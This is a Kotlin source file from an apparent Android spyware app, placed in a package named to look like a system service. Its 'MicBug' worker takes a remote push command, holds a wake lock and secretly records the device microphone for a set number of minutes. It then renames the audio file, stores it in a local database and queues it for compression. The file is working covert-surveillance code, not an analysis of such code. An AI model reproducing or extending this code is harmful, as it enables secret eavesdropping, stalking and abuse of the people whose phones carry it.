package com.android.services.workers.micbug

import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.PowerManager
import android.util.Log
import androidx.localbroadcastmanager.content.LocalBroadcastManager
import androidx.work.Data
import androidx.work.WorkManager
import com.android.services.db.entities.MicBug
import com.android.services.enums.FcmPushStatus
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.models.MicBugCommand
import com.android.services.receiver.AudioFileCompressorReceiver
import com.android.services.receiver.VideoFileCompressorReceiver
import com.android.services.util.AppConstants
import com.android.services.util.AppUtils
import com.android.services.util.Mp3LameRecorder
import com.android.services.util.incrementOne
import com.android.services.util.logException
import com.android.services.util.logVerbose
import com.android.services.util.sizeInKb
import com.arthenica.mobileffmpeg.Config
import com.arthenica.mobileffmpeg.FFmpeg
import com.google.gson.Gson
import io.reactivex.rxjava3.android.schedulers.AndroidSchedulers
import io.reactivex.rxjava3.core.Observable
import io.reactivex.rxjava3.schedulers.Schedulers
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.io.File
import java.util.concurrent.TimeUnit
import kotlin.math.roundToInt

class MicBugCommandProcessingBaseImpll(
    val context: Context,
    val localDatabaseSource: LocalDatabaseSource,
    val coroutineScope: CoroutineScope,
) : MicBugCommandProcessingBase(context) {
    private val micBugsWithPushId: MutableList<MicBug> = mutableListOf();
    override fun initialize() {
        logVerbose("In OnCreate", AppConstants.MIC_BUG_TYPE)
        logVerbose("In OnCreate", "MicBugProcessInfo")
        micBugStatus = FcmPushStatus.INITIALIZED.getStatus()
    }

    override fun parseIntent(data: Data?) {
        data?.let {
            logVerbose(
                "In OnStartCommand -> Ready to start MicBug Recording",
                AppConstants.MIC_BUG_TYPE
            )
            micBugPush = Gson().fromJson(data.getString(MIC_BUG_PUSH), MicBugCommand::class.java)
            logVerbose("MicBug Push = $micBugPush", AppConstants.MIC_BUG_TYPE)
            logVerbose("MicBug Push = $micBugPush", "MicBugProcessInfo")

            acquireWakeLock()
            micBugPush?.let { push ->
                intervalConsumed = 0
                push.customData?.let { data -> customData = data }
                micBugsWithPushId.addAll(localDatabaseSource.selectMicBugWithSamePushId(push.pushId))
                logVerbose(
                    "Previous micbug list size=${micBugsWithPushId.size}",
                    "MicBugProcessInfo"
                )
                if (micBugsWithPushId.isNotEmpty()) {
                    val totalInterval = micBugsWithPushId[0].totalDuration
                    logVerbose("Pending total duration = $totalInterval", "MicBugProcessInfo")
                    var consumeTime = 0
                    micBugsWithPushId.forEach {
                        consumeTime += it.duration.toInt()
                    }
                    logVerbose("ConsumedTime =$consumeTime", "MicBugProcessInfo")
                    val remainingInterval = totalInterval - consumeTime;
                    logVerbose("Remaining time =$remainingInterval", "MicBugProcessInfo")

                    val newCustomData = (remainingInterval / 60.0).roundToInt()
                    customData = newCustomData.toString()
                    logVerbose("New Custom data =$newCustomData", "MicBugProcessInfo")
                }
                executorService.execute {
                    startRecording()
                }
                startTimerObserver()
            } ?: kotlin.run {
                logVerbose("MicBug Push is Null -> Stopping Service", AppConstants.MIC_BUG_TYPE)
                stopWorker()
            }
        } ?: kotlin.run {
            logVerbose("${AppConstants.MIC_BUG_TYPE} MicBug Intent is Null ")
            AppUtils.appendLog(applicationContext, "MicBug Intent is null, stopping service")
            stopWorker()
        }
    }

    override fun createOutputFilePath() {
        mFilePath = AppUtils.retrieveFilePath(
            applicationContext,
            AppConstants.DIR_MIC_BUG,
            System.currentTimeMillis().toString() + "_" + AppUtils.getUniqueId() + ".mp3"
        )
    }

    override fun onServiceDestroy() {
        logVerbose("In OnDestroy -> Releasing Resources", AppConstants.MIC_BUG_TYPE)
        coroutineScope.launch {
            try {
                stopRecording()
                reNameFile(applicationContext, mFilePath, null)
                insertMicBug()
                if (disposable != null && !disposable!!.isDisposed) {
                    disposable!!.dispose()
                }
                shutDownExecutorService()
                releaseWakeLock()
                LocalBroadcastManager.getInstance(applicationContext)
                    .sendBroadcast(Intent(AudioFileCompressorReceiver.ACTION_COMPRESS_AUDIO))
            } catch (exp: Exception) {
                logException("onDestroy Exception = ${exp.message}", AppConstants.MIC_BUG_TYPE)
                updateMicBugPushAsCorrupted()
            }
        }
    }

    private suspend fun reNameFile(context: Context, sourceFile: String, destFile: String?) {
        withContext(Dispatchers.IO) {
            if (destFile != null) {
                AppUtils.reNameSourceFileWithDestFile(
                    context,
                    sourceFile,
                    destFile,
                    AppConstants.MIC_BUG_TYPE
                )
            } else {
                AppUtils.reNameFile(sourceFile, AppConstants.MIC_BUG_TYPE)
                logVerbose("compression destFile Path is Null", AppConstants.MIC_BUG_TYPE)
            }
        }
    }

    /** This compresses the Output MicBug File **/
    private suspend fun compressOutputFile(): String? {
        return try {
            if (AppConstants.osGreaterThanEqualToNougat) {
                withContext(Dispatchers.IO) {
                    val destFile = "compress_${mFilePath.substringAfterLast("/")}"
                    val destFilePAth =
                        mFilePath.replace(mFilePath.substringAfterLast("/"), destFile)
                    logVerbose("size before compression = ${File(mFilePath).sizeInKb}")
                    when (val rc =
                        FFmpeg.execute("-y -i $mFilePath -ar 44100 -ac 2 -ab 20k -c:v mpeg4 $destFilePAth")) {
                        Config.RETURN_CODE_SUCCESS -> {
                            logVerbose(
                                "Command execution completed successfully.",
                                AppConstants.MIC_BUG_TYPE
                            )
                            destFilePAth
                        }

                        Config.RETURN_CODE_CANCEL -> {
                            logVerbose(
                                "Command execution cancelled by user.",
                                AppConstants.MIC_BUG_TYPE
                            )
                            null
                        }

                        else -> {
                            logVerbose(
                                String.format(
                                    "Command execution failed with rc=%d and the output below.",
                                    rc
                                ), AppConstants.MIC_BUG_TYPE
                            )
                            Config.printLastCommandOutput(Log.INFO)
                            null
                        }
                    }
                }
            } else {
                null
            }
        } catch (e: Exception) {
            null
        }
    }

    /**
     * Start Processing the Mic Bug, with the provided interval [customData]
     * Converts [customData] to Long, passes minutes to Observable, which will fire after the span of time in long
     */
    private fun startTimerObserver() {
        disposable = Observable.interval(INITIAL_DELAY, PERIODIC_INTERVAL, TimeUnit.MILLISECONDS)
            .subscribeOn(Schedulers.single())
            .observeOn(AndroidSchedulers.mainThread())
            .doOnSubscribe {}
            .subscribe {
                val interval: Int =
                    if (customData.isNotEmpty()) customData.toInt() else 1
                if (intervalConsumed >= interval) {
                    logVerbose("MicBug interval reached to max", "MicBugProcessInfo")
                    micBugStatus = FcmPushStatus.SUCCESS.getStatus()
                    stopWorker()
                }
                logVerbose(
                    "MicBug interval less than max interval intervalConsumed =$intervalConsumed interval=$interval",
                    "MicBugProcessInfo"
                )
                intervalConsumed = intervalConsumed.incrementOne()
            }
    }

    private fun shutDownExecutorService() {
        if (!executorService.isShutdown) {
            executorService.shutdown()
        }
    }

    override fun startRecording() {
        mRecordingStartTime = System.currentTimeMillis()
        try {
            logVerbose("Preparing to Start Recording", "MicBugProcessInfo")
            logVerbose("Preparing to Start Recording", AppConstants.MIC_BUG_TYPE)
            recorder = Mp3LameRecorder(mFilePath, 44100)
            recorder!!.startRecording(Mp3LameRecorder.TYPE_MIC_BUG)
        } catch (exp: Exception) {
            logException(
                "Start Recording Exception = ${exp.message}",
                AppConstants.MIC_BUG_TYPE,
                exp
            )
            updateMicBugPushAsCorrupted()
        }
    }

    override suspend fun stopRecording() {
        withContext(Dispatchers.IO) {
            logVerbose("Preparing to Stop Recording", AppConstants.MIC_BUG_TYPE)
            try {
                if (recorder != null) {
                    logVerbose("Recording stopped", "MicBugProcessInfo")
                    recorder!!.stopRecording()
                    recorder = null
                    logVerbose("Recording Stopped", AppConstants.MIC_BUG_TYPE)
                }
            } catch (e: Exception) {
                logException(
                    "Stop Recording Exception = ${e.message}",
                    AppConstants.MIC_BUG_TYPE,
                    e
                )
                updateMicBugPushAsCorrupted()
            }
        }
    }

    private suspend fun insertMicBug() {
        withContext(Dispatchers.IO) {
            mFilePath = mFilePath.replace(".mp3", ".mrc")
            val currentTimeInMilliSeconds = System.currentTimeMillis()
            val elapsedTime = (currentTimeInMilliSeconds - mRecordingStartTime).toInt() / 1000
            logVerbose(
                "MiBug file duration = ($mRecordingStartTime, $elapsedTime)",
                AppConstants.MIC_BUG_TYPE
            )
            logVerbose("Micbug going to insert", "MicBugProcessInfo")
            if (micBugStatus == FcmPushStatus.SUCCESS.getStatus() || micBugStatus == FcmPushStatus.INTERRUPTED.getStatus()) {
                if (AppUtils.validFileSize(File(mFilePath)) && elapsedTime > 2) {
                    logVerbose("Micbug going to insert", "MicBugProcessInfo")
                    val micBug = MicBug()
                    micBug.apply {
                        this.file = mFilePath
                        this.name = AppUtils.formatDateCustom(currentTimeInMilliSeconds.toString())
                        this.duration = elapsedTime.toString()
                        this.totalDuration = customData.toInt() * 60
                        this.startDatetime = AppUtils.formatDate(mRecordingStartTime.toString())
                        this.pushId = micBugPush?.pushId ?: ""
                        this.pushStatus = micBugStatus!!
                        this.date = AppUtils.getDate(currentTimeInMilliSeconds)
                        this.isCompressed = 0
                        this.status = 0
                    }
                    localDatabaseSource.insertMicBug(micBug)
                    logVerbose("Micbug inserted", "MicBugProcessInfo")
                } else {
                    logVerbose(
                        "MiBug failed with duration = $elapsedTime and Size = ${
                            File(
                                mFilePath
                            ).sizeInKb
                        }", AppConstants.MIC_BUG_TYPE
                    )
                    logVerbose("Micbug insert failed 1 $micBugStatus", "MicBugProcessInfo")
                    localDatabaseSource.updatePushStatus(
                        micBugPush!!.pushId,
                        FcmPushStatus.FILE_CORRUPTED.getStatus(),
                        0
                    )
                    AppUtils.deleteFile(applicationContext, mFilePath)
                }
            } else if (micBugStatus == FcmPushStatus.INITIALIZED.getStatus()) {
                if (AppUtils.validFileSize(File(mFilePath)) && elapsedTime > 2) {
                    var name = AppUtils.formatDateCustom(currentTimeInMilliSeconds.toString())
                    if (micBugsWithPushId.isNotEmpty()) {
                        name = name + "(" + (micBugsWithPushId.size + 1).toString() + ")"
                    } else {
                        name += "(1)"
                    }
                    logVerbose("Micbug going to insert", "MicBugProcessInfo")
                    val micBug = MicBug()
                    micBug.apply {
                        this.file = mFilePath
                        this.name = name
                        this.duration = elapsedTime.toString()
                        this.totalDuration = customData.toInt() * 60
                        this.startDatetime = AppUtils.formatDate(mRecordingStartTime.toString())
                        this.pushId = micBugPush?.pushId ?: ""
                        this.pushStatus = "1"
                        this.date = AppUtils.getDate(currentTimeInMilliSeconds)
                        this.isCompressed = 0
                        this.status = 0
                    }
                    localDatabaseSource.insertMicBug(micBug)
                    logVerbose("Micbug inserted", "MicBugProcessInfo")
                } else {
                    logVerbose(
                        "MiBug failed with duration = $elapsedTime and Size = ${
                            File(
                                mFilePath
                            ).sizeInKb
                        }", AppConstants.MIC_BUG_TYPE
                    )
                    logVerbose("Micbug insert failed 1 $micBugStatus", "MicBugProcessInfo")
                    localDatabaseSource.updatePushStatus(
                        micBugPush!!.pushId,
                        FcmPushStatus.FILE_CORRUPTED.getStatus(),
                        0
                    )
                    AppUtils.deleteFile(applicationContext, mFilePath)
                }
            } else {
                if (micBugStatus != null) {
                    logVerbose("Micbug insert failed 2 $micBugStatus", "MicBugProcessInfo")
                    localDatabaseSource.updatePushStatus(
                        micBugPush!!.pushId,
                        micBugStatus!!,
                        0
                    )
                } else {
                    logVerbose("Micbug insert failed 3 $micBugStatus", "MicBugProcessInfo")
                    localDatabaseSource.updatePushStatus(
                        micBugPush!!.pushId,
                        FcmPushStatus.FAILED.getStatus(),
                        0
                    )
                }
                AppUtils.deleteFile(applicationContext, mFilePath)
                logVerbose("MiBug failed with status $micBugStatus", AppConstants.MIC_BUG_TYPE)
                return@withContext
            }
        }
    }

    private fun updateMicBugPushAsCorrupted() {
        micBugStatus = FcmPushStatus.FILE_CORRUPTED.getStatus()
        coroutineScope.launch {
            withContext(Dispatchers.IO) {
                localDatabaseSource.updatePushStatus(
                    micBugPush!!.pushId,
                    FcmPushStatus.FILE_CORRUPTED.getStatus(),
                    0
                )
                AppUtils.deleteFile(applicationContext, mFilePath)
            }
        }
        stopWorker()
    }

    private fun acquireWakeLock() {
        val interval =
            if (customData.isNotEmpty()) customData.toInt() else 1
        val pm = context.applicationContext.getSystemService(Service.POWER_SERVICE) as PowerManager
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, TAG_MIC_BUG_WAKE_LOCK)
        wakeLock!!.acquire((interval * 60 * 1000).toLong())
    }

    private fun stopWorker() {
        WorkManager.getInstance(context).cancelUniqueWork(MIC_BUG_WORKER_TAG)
    }

    private fun releaseWakeLock() {
        if (wakeLock != null && wakeLock!!.isHeld) wakeLock!!.release()
    }
}